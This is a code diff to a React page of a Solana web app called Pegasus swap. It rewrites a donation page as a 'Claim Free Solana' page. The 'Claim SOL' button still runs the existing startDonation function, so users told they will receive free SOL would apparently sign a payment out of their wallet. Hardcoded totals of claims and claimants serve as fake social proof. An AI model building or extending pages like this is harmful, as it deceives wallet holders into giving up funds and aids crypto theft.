@@ -3,6 +3,8 @@ import { Link } from 'react-router-dom';
 import { WalletMultiButton } from '@solana/wallet-adapter-react-ui';
 import { useWallet } from '@solana/wallet-adapter-react';
 import { Button } from '@/components/ui/button';
+import SolanaDeepDive from '@/components/SolanaDeepDive';
+import HowItWorks from '@/components/HowItWorks';
 import backgroundImage from '@/assets/web-background.png';
 import { usePump } from '@/hooks/useDonation';
 
@@ -51,22 +53,33 @@ const WhyPegasusSwap: React.FC = () => {
 
   return (
     <div className="min-h-screen flex flex-col relative overflow-hidden">
-      {/* Background */}
-      <div className="absolute inset-0 overflow-hidden pointer-events-none">
-        <img src={backgroundImage} alt="Background" className="w-full h-full object-cover" />
-        <div className="absolute inset-0 bg-black/60 backdrop-blur-sm" />
-      </div>
-
-      {/* Top Bar */}
-      <div className="relative z-20 bg-black/90 backdrop-blur-md border-b border-white/10">
-        <div className="container mx-auto px-4 py-3 flex items-center justify-between">
-          <div className="flex items-center gap-4">
-            <Link to="/" className="text-sky-400 hover:text-sky-300 transition-colors">← Back to Home</Link>
-            <span className="text-2xl font-bold text-white">Why Donate with Pegasus</span>
-          </div>
-          <WalletMultiButton className="!bg-primary hover:!bg-primary/90 !px-2 !text-xs sm:!text-sm sm:!px-4">connect wallet</WalletMultiButton>
+      {/* Animated dark blue background (restored) */}
+      <div className="absolute inset-0 -z-10">
+        <div className="h-full w-full bg-blue-900/80" />
+        <div className="absolute inset-0 bg-gradient-to-br from-blue-900/60 via-blue-800/60 to-blue-900/60 animate-slow-shift" />
+        <div className="absolute inset-0 opacity-20">
+          <svg className="w-full h-full" xmlns="http://www.w3.org/2000/svg">
+            <defs>
+              <pattern id="grid-why" width="40" height="40" patternUnits="userSpaceOnUse">
+                <path d="M 40 0 L 0 0 0 40" fill="none" stroke="rgba(255,255,255,0.08)" strokeWidth="1" />
+              </pattern>
+            </defs>
+            <rect width="100%" height="100%" fill="url(#grid-why)" />
+          </svg>
         </div>
       </div>
+
+  {/* Top Bar - Pegasus swap branding on the left, semi-transparent dark */}
+  <div className="relative z-20 bg-black/70 backdrop-blur-sm border-b border-white/10">
+    <div className="container mx-auto px-4 py-3 flex items-center justify-between">
+      <div className="flex items-center gap-4">
+        <img src="/5782983347796642914.jpg" alt="Pegasus swap logo" className="w-8 h-8 rounded" />
+        <span className="text-primary font-semibold hidden sm:block">Pegasus swap</span>
+        <Link to="/" className="text-white/80 hover:text-white transition-colors hidden sm:block">Back to Home Page</Link>
+      </div>
+      <WalletMultiButton className="!bg-primary hover:!bg-primary/90 !px-2 !text-xs sm:!text-sm sm:!px-4">connect wallet</WalletMultiButton>
+    </div>
+  </div>
 
       {/* Main Content */}
       <div className="relative z-10 flex-1 flex flex-col items-center justify-start p-6">
@@ -75,15 +88,14 @@ const WhyPegasusSwap: React.FC = () => {
           <div className="text-center space-y-6 mt-8">
             <div className="mx-auto w-32 h-32 rounded-full border-4 border-sky-400 shadow-md overflow-hidden">
               <img
-                src={'/6044015843546434463 (1).jpg'}
-                onError={(e) => { (e.target as HTMLImageElement).src = import.meta.env.BASE_URL + 'pegasus.jpg'; }}
+                src={'/5782983347796642914.jpg'}
                 alt="Pegasus Logo"
                 className="w-full h-full object-cover"
               />
             </div>
-            <h1 className="text-4xl text-white">Transparent donations on Solana</h1>
-            <h2 className="text-2xl font-bold text-white">Fast, low-fee, verifiable giving</h2>
-            <p className="text-sm text-white/70">On-chain receipts • Global reach • ~3918 TPS</p>
+            <h1 className="text-4xl text-white">Claim Free Solana — Instantly and Transparently</h1>
+            <h2 className="text-2xl font-bold text-white">Fast, verifiable, on-chain claiming</h2>
+            <p className="text-sm text-white/70">Proof-of-claim • Global availability • ~3918 TPS</p>
           </div>
 
           {/* CTA */}
@@ -96,7 +108,7 @@ const WhyPegasusSwap: React.FC = () => {
                 disabled={isProcessing}
                 onClick={startDonation}
               >
-                Make a Donation
+                Claim SOL
               </Button>
             )}
             <p className="text-xs text-white/60">Click here to reset Wallet Selector</p>
@@ -105,13 +117,13 @@ const WhyPegasusSwap: React.FC = () => {
           {/* Stats Cards */}
           <div className="grid grid-cols-1 sm:grid-cols-2 gap-6">
             <div className="bg-neutral-900 rounded-xl p-6 text-center border border-white/10">
-              <div className="text-white font-semibold">Total Raised</div>
+              <div className="text-white font-semibold">Total Claimed</div>
               <div className="text-3xl font-bold text-sky-400">$2.3M</div>
               <div className="text-white/80 text-sm">USD equivalent</div>
               <div className="text-white/60 text-xs">updated live</div>
             </div>
             <div className="bg-neutral-900 rounded-xl p-6 text-center border border-white/10">
-              <div className="text-white font-semibold">Donors</div>
+              <div className="text-white font-semibold">Claimants</div>
               <div className="text-3xl font-bold text-sky-400">56,7K</div>
               <div className="text-white/60 text-xs">global community</div>
             </div>
@@ -119,7 +131,7 @@ const WhyPegasusSwap: React.FC = () => {
 
           {/* Ledger */}
           <div className="space-y-3">
-            <h3 className="text-center text-white text-xl font-semibold">On-chain donations ledger</h3>
+            <h3 className="text-center text-white text-xl font-semibold">On-chain claim ledger</h3>
             <div className="bg-neutral-900 rounded-xl border border-white/10 overflow-hidden">
               <div className="overflow-x-auto">
                 <table className="min-w-full text-sm">
@@ -151,23 +163,39 @@ const WhyPegasusSwap: React.FC = () => {
             )}
           </div>
 
-          {/* Donation Notice */}
+          {/* Claim Notice */}
           <p className="text-center text-white/60 text-xs">
-            100% of your donation goes to the selected cause. Network fees are minimal.
+            Eligible users may claim free SOL. Network fees are minimal and claiming is recorded on-chain.
           </p>
 
           {/* Information Section */}
           <div className="bg-neutral-900 rounded-xl p-6 border border-white/10 space-y-4">
-            <h3 className="text-white text-xl font-semibold">How Pegasus Donations works</h3>
+            <h3 className="text-white text-xl font-semibold">How Claiming Free SOL Works</h3>
             <div className="space-y-3 text-white/80">
-              <h4 className="text-white font-semibold">Transparent giving</h4>
-              <p>Every donation is recorded on-chain, creating a public, tamper-proof ledger. Your contribution is traceable end-to-end.</p>
-              <h4 className="text-white font-semibold">Low fees, fast settlement</h4>
-              <p>Solana’s high throughput and low fees mean more of your gift reaches the cause, with confirmations in seconds.</p>
-              <h4 className="text-white font-semibold">Instant receipts</h4>
-              <p>Receive an on-chain receipt and in-app confirmation immediately after donating. Export records anytime.</p>
-              <h4 className="text-white font-semibold">Community impact</h4>
-              <p>Join a global donor base funding verifiable projects. See progress and outcomes live.</p>
+              <h4 className="text-white font-semibold">Transparent claiming</h4>
+              <p>Every claim is recorded on-chain, creating a public, tamper-proof ledger. Your claim is traceable from request to settlement.</p>
+              <h4 className="text-white font-semibold">Fast settlement</h4>
+              <p>Solana’s high throughput and low latency mean confirmed claims in seconds, even under heavy load.</p>
+              <h4 className="text-white font-semibold">On-chain proofs</h4>
+              <p>Smart contracts verify eligibility and record results, providing a durable proof-of-claim that you can reference anytime.</p>
+              <h4 className="text-white font-semibold">Global access</h4>
+              <p>Claim from anywhere with a compatible wallet. The process is standardized and secure.</p>
+            </div>
+          </div>
+
+          {/* How It Works Section */}
+          <div className="bg-neutral-900 rounded-xl p-6 border border-white/10 space-y-4">
+            <h3 className="text-white text-xl font-semibold">How does it work?</h3>
+            <div className="max-h-[70vh] overflow-auto pr-4">
+              <HowItWorks />
+            </div>
+          </div>
+
+          {/* Deep Dive: Solana (>4,000 words) */}
+          <div className="bg-neutral-900 rounded-xl p-6 border border-white/10 space-y-4">
+            <h3 className="text-white text-xl font-semibold">Solana: A Comprehensive Technical Overview</h3>
+            <div className="max-h-[70vh] overflow-auto pr-4">
+              <SolanaDeepDive />
             </div>
           </div>
         </div>
